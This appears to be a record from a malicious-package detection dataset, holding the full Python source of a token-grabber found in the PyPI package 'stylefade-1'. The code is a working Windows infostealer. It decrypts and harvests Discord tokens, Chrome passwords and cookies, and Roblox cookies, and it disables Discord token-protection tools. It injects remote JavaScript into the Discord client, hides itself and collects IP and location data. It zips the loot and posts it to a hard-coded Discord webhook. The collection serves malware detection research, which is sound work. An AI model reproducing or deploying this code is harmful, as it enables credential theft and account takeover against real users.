[
  {
    "pyfile": "__main__.py",
    "malicious_code_snippets": "import os\nimport json\nimport httpx\nimport ctypes\nimport shutil\nimport psutil\nimport asyncio\nimport sqlite3\nimport zipfile\nimport threading\nimport subprocess\n\nfrom sys import argv\nfrom base64 import b64decode\nfrom re import findall, match\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\n\nconfig = {\n    'webhook': \"https://discord.com/api/webhooks/1059250360717422632/9krzHX4GJ_KKKQgq_A3nUyq-VvFwJpcd0nL9rdtTlFa6oTVxAwJaMWXoz44LWsHv7E8R\",\n    'injection_url': \"https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js\",\n    'kill_discord': False,\n    'startup': False,\n    'hide_self': True\n}\n\nclass functions(object):\n    @staticmethod\n    def getHeaders(token: str = None):\n        headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n\n    @staticmethod\n    def get_master_key(path) -> str:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    @staticmethod\n    def decrypt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    @staticmethod\n    def config(e: str) -> str or bool | None:\n        return config.get(e)\n\nclass Hazard_Token_Grabber_V2(functions):\n    def __init__(self):\n        self.webhook = self.config('webhook')\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.temp = os.getenv(\"temp\")\n        self.startup = self.roaming + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n        self.dir = self.temp+\"\\\\Hazard_Token_Grabber_V2\"\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\"\n        try:\n            os.mkdir(os.path.join(self.dir))\n        except Exception:\n            pass\n        self.sep = os.sep\n        self.tokens = []\n        self.robloxcookies = []\n\n    def try_extract(func):\n        def wrapper(*args, **kwargs):\n            try:\n                func(*args, **kwargs)\n            except Exception:\n                pass\n        return wrapper\n\n    async def checkToken(self, tkn: str) -> str:\n        try:\n            r = httpx.get(\n                url=self.baseurl,\n                headers=self.getHeaders(tkn),\n                timeout=5.0\n            )\n        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):\n            pass\n        if r.status_code == 200 and tkn not in self.tokens:\n            self.tokens.append(tkn)\n\n    async def init(self):\n        await self.bypassBetterDiscord()\n        await self.bypassTokenProtector()\n        function_list = [self.screenshot, self.grabTokens,\n                         self.grabRobloxCookie]\n        if self.config('hide_self'):\n            function_list.append(self.hide)\n        if self.config('kill_discord'):\n            function_list.append(self.killDiscord)\n        if self.config('startup'):\n            function_list.append(self.startup)\n        if os.path.exists(self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Default') and os.path.exists(self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State'):\n            function_list.append(self.grabPassword)\n            function_list.append(self.grabCookies)\n        for func in function_list:\n            process = threading.Thread(target=func, daemon=True)\n            process.start()\n        for t in threading.enumerate():\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n        self.neatifyTokens()\n        await self.injector()\n        self.finish()\n        shutil.rmtree(self.dir)\n\n    def hide(self):\n        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)\n\n    def startup(self):\n        try:\n            shutil.copy2(argv[0], self.startup)\n        except Exception:\n            pass\n\n    async def injector(self):\n        for _dir in os.listdir(self.appdata):\n            if 'discord' in _dir.lower():\n                discord = self.appdata+self.sep+_dir\n                disc_sep = discord+self.sep\n                for __dir in os.listdir(os.path.abspath(discord)):\n                    if match(r'app-(\\d*\\.\\d*)*', __dir):\n                        app = os.path.abspath(disc_sep+__dir)\n                        inj_path = app+'\\\\modules\\\\discord_desktop_core-3\\\\discord_desktop_core\\\\'\n                        if os.path.exists(inj_path):\n                            if self.startup not in argv[0]:\n                                try:\n                                    os.makedirs(\n                                        inj_path+'initiation', exist_ok=True)\n                                except (FileExistsError, PermissionError):\n                                    pass\n                            f = httpx.get(self.config('injection_url')).text.replace(\n                                \"%WEBHOOK%\", self.webhook)\n                            with open(inj_path+'index.js', 'w', errors=\"ignore\") as indexFile:\n                                indexFile.write(f)\n                            os.startfile(app + self.sep + _dir + '.exe')\n\n    def killDiscord(self):\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in\n                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n\n    async def bypassTokenProtector(self):\n        tp = f\"{self.roaming}\\\\DiscordTokenProtector\\\\\"\n        config = tp+\"config.json\"\n        for i in [\"DiscordTokenProtector.exe\", \"ProtectionPayload.dll\", \"secure.dat\"]:\n            try:\n                os.remove(tp+i)\n            except FileNotFoundError:\n                pass\n        if os.path.exists(config):\n            with open(config, errors=\"ignore\") as f:\n                try:\n                    item = json.load(f)\n                except json.decoder.JSONDecodeError:\n                    return\n                item['Rdimo_just_shit_on_this_token_protector'] = \"https://github.com/Rdimo\"\n                item['auto_start'] = False\n                item['auto_start_discord'] = False\n                item['integrity'] = False\n                item['integrity_allowbetterdiscord'] = False\n                item['integrity_checkexecutable'] = False\n                item['integrity_checkhash'] = False\n                item['integrity_checkmodule'] = False\n                item['integrity_checkscripts'] = False\n                item['integrity_checkresource'] = False\n                item['integrity_redownloadhashes'] = False\n                item['iterations_iv'] = 364\n                item['iterations_key'] = 457\n                item['version'] = 69420\n            with open(config, 'w') as f:\n                json.dump(item, f, indent=2, sort_keys=True)\n            with open(config, 'a') as f:\n                f.write(\n                    \"\\n\\n//Rdimo just shit on this token protector | https://github.com/Rdimo\")\n\n    async def bypassBetterDiscord(self):\n        bd = self.roaming+\"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        if os.path.exists(bd):\n            x = \"api/webhooks\"\n            with open(bd, 'r', encoding=\"cp437\", errors='ignore') as f:\n                txt = f.read()\n                content = txt.replace(x, 'RdimoTheGoat')\n            with open(bd, 'w', newline='', encoding=\"cp437\", errors='ignore') as f:\n                f.write(content)\n\n    def getProductValues(self):\n        try:\n            wkey = subprocess.check_output(\n                r\"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\", creationflags=0x08000000).decode().rstrip()\n        except Exception:\n            wkey = \"N/A (Likely Pirated)\"\n        try:\n            productName = subprocess.check_output(\n                r\"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\", creationflags=0x08000000).decode().rstrip()\n        except Exception:\n            productName = \"N/A\"\n        return [productName, wkey]\n\n    @try_extract\n    def grabTokens(self):\n        paths = {\n            'Discord': self.roaming + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'\n        }\n        for _, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            if \"discord\" not in path:\n                for file_name in os.listdir(path):\n                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for regex in (self.regex):\n                            for token in findall(regex, line):\n                                asyncio.run(self.checkToken(token))\n            else:\n                if os.path.exists(self.roaming+'\\\\discord\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in findall(self.encrypted_regex, line):\n                                token = self.decrypt_val(b64decode(\n                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\\\discord\\\\Local State'))\n                                asyncio.run(self.checkToken(token))\n        if os.path.exists(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for regex in (self.regex):\n                            for token in findall(regex, line):\n                                asyncio.run(self.checkToken(token))\n\n    @try_extract\n    def grabPassword(self):\n        master_key = self.get_master_key(\n            self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State')\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Login Data'\n        login = self.temp+self.sep+\"Loginvault1.db\"\n        shutil.copy2(login_db, login)\n        conn = sqlite3.connect(login)\n        cursor = conn.cursor()\n        with open(self.dir+\"\\\\Google Passwords.txt\", \"w\", encoding=\"cp437\", errors='ignore') as f:\n            cursor.execute(\n                \"SELECT action_url, username_value, password_value FROM logins\")\n            for r in cursor.fetchall():\n                url = r[0]\n                username = r[1]\n                encrypted_password = r[2]\n                decrypted_password = self.decrypt_val(\n                    encrypted_password, master_key)\n                if url != \"\":\n                    f.write(\n                        f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n\")\n        cursor.close()\n        conn.close()\n        os.remove(login)\n\n    @try_extract\n    def grabCookies(self):\n        master_key = self.get_master_key(\n            self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State')\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Network\\\\cookies'\n        login = self.temp+self.sep+\"Loginvault2.db\"\n        shutil.copy2(login_db, login)\n        conn = sqlite3.connect(login)\n        cursor = conn.cursor()\n        with open(self.dir+\"\\\\Google Cookies.txt\", \"w\", encoding=\"cp437\", errors='ignore') as f:\n            cursor.execute(\n                \"SELECT host_key, name, encrypted_value from cookies\")\n            for r in cursor.fetchall():\n                host = r[0]\n                user = r[1]\n                decrypted_cookie = self.decrypt_val(r[2], master_key)\n                if host != \"\":\n                    f.write(\n                        f\"Host: {host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\\n\")\n                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:\n                    self.robloxcookies.append(decrypted_cookie)\n        cursor.close()\n        conn.close()\n        os.remove(login)\n\n    def neatifyTokens(self):\n        f = open(self.dir+\"\\\\Discord Info.txt\",\n                 \"w\", encoding=\"cp437\", errors='ignore')\n        for token in self.tokens:\n            j = httpx.get(\n                self.baseurl, headers=self.getHeaders(token)).json()\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\n            badges = \"\"\n            flags = j['flags']\n            flags = j['flags']\n            if (flags == 1):\n                badges += \"Staff, \"\n            if (flags == 2):\n                badges += \"Partner, \"\n            if (flags == 4):\n                badges += \"Hypesquad Event, \"\n            if (flags == 8):\n                badges += \"Green Bughunter, \"\n            if (flags == 64):\n                badges += \"Hypesquad Bravery, \"\n            if (flags == 128):\n                badges += \"HypeSquad Brillance, \"\n            if (flags == 256):\n                badges += \"HypeSquad Balance, \"\n            if (flags == 512):\n                badges += \"Early Supporter, \"\n            if (flags == 16384):\n                badges += \"Gold BugHunter, \"\n            if (flags == 131072):\n                badges += \"Verified Bot Developer, \"\n            if (badges == \"\"):\n                badges = \"None\"\n            email = j.get(\"email\")\n            phone = j.get(\"phone\") if j.get(\n                \"phone\") else \"No Phone Number attached\"\n            nitro_data = httpx.get(\n                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()\n            has_nitro = False\n            has_nitro = bool(len(nitro_data) > 0)\n            billing = bool(len(json.loads(httpx.get(\n                self.baseurl+\"/billing/payment-sources\", headers=self.getHeaders(token)).text)) > 0)\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nToken: {token}\\nHas Billing: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nEmail: {email}\\nPhone: {phone}\\n\\n\")\n        f.close()\n\n    def grabRobloxCookie(self):\n        def subproc(path):\n            try:\n                return subprocess.check_output(\n                    fr\"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY\",\n                    creationflags=0x08000000).decode().rstrip()\n            except Exception:\n                return None\n        reg_cookie = subproc(r'HKLM')\n        if not reg_cookie:\n            reg_cookie = subproc(r'HKCU')\n        if reg_cookie:\n            self.robloxcookies.append(reg_cookie)\n        if self.robloxcookies:\n            with open(self.dir+\"\\\\Roblox Cookies.txt\", \"w\") as f:\n                for i in self.robloxcookies:\n                    f.write(i+'\\n')\n\n    def finish(self):\n        for i in os.listdir(self.dir):\n            if i.endswith('.txt'):\n                path = self.dir+self.sep+i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        try:\n                            os.remove(path)\n                        except PermissionError:\n                            pass\n                    with open(path, \"w\", encoding=\"utf-8\") as f:\n                        f.write(\n                            \"ðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n                    with open(path, \"a\", encoding=\"utf-8\") as fp:\n                        fp.write(\n                            x+\"\\n\\nðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2\")\n        w = self.getProductValues()\n        wname = w[0].replace(\" \", \"á Žâ€¯\")\n        wkey = w[1].replace(\" \", \"á Žâ€¯\")\n        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(\".\")[0]\n        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(\".\")[0]\n        data = httpx.get(\"https://ipinfo.io/json\").json()\n        ip = data.get('ip').replace(\" \", \"á Žâ€¯\")\n        city = data.get('city').replace(\" \", \"á Žâ€¯\")\n        country = data.get('country').replace(\" \", \"á Žâ€¯\")\n        region = data.get('region').replace(\" \", \"á Žâ€¯\")\n        org = data.get('org').replace(\" \", \"á Žâ€¯\")\n        googlemap = \"https://www.google.com/maps/search/google+map++\" + \\\n            data.get('loc')\n        _zipfile = os.path.join(\n            self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = os.path.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        files_found = ''\n        for f in os.listdir(self.dir):\n            files_found += f\"ãƒ»{f}\\n\"\n        tokens = ''\n        for tkn in self.tokens:\n            tokens += f'{tkn}\\n\\n'\n        fileCount = f\"{len(files)} Files Found: \"\n        embed = {\n            'username'\n            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',\n            'embeds': [\n                {\n                    'author': {\n                        'name': f'*{os.getlogin()}* Just ran Hazard Token Grabber.V2',\n                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',\n                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'\n                    },\n                    'color': 16119101,\n                    'description': f'[Google Maps Location]({googlemap})',\n                    'fields': [\n                        {\n                            'name': '\\u200b',\n                            'value': f'''```fix\n                                IP:á Žâ€¯{ip}\n                                Org:á Žâ€¯{org}\n                                City:á Žâ€¯{city}\n                                Region:á Žâ€¯{region}\n                                Country:á Žâ€¯{country}```\n                            '''.replace(' ', ''),\n                            'inline': True\n                        },\n                        {\n                            'name': '\\u200b',\n                            'value': f'''```fix\n                                PCName:â€¯{os.getenv('COMPUTERNAME').replace(\" \", \"á Žâ€¯\")}\n                                WinKey:á Žâ€¯{wkey}\n                                Platform:á Žâ€¯{wname}\n                                DiskSpace:á Žâ€¯{disk}GB\n                                Ram:á Žâ€¯{ram}GB```\n                            '''.replace(' ', ''),\n                            'inline': True\n                        },\n                        {\n                            'name': '**Tokens:**',\n                            'value': f'''```yaml\n                                {tokens if tokens else \"No tokens extracted\"}``` \n                            '''.replace(' ', ''),\n                            'inline': False\n                        },\n                        {\n                            'name': fileCount,\n                            'value': f'''```ini\n                                [\n                                {files_found.strip()}\n                                ]```\n                            '''.replace(' ', ''),\n                            'inline': False\n                        }\n                    ],\n                    'footer': {\n                        'text': 'ðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2'\n                    }\n                }\n            ]\n        }\n        httpx.post(self.webhook, json=embed)\n        with open(_zipfile, 'rb') as f:\n            httpx.post(self.webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(Hazard_Token_Grabber_V2().init())"
  },
  {
    "metadata": {
      "package_name": "stylefade-1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/stylefade-1.txt"
    }
  }
]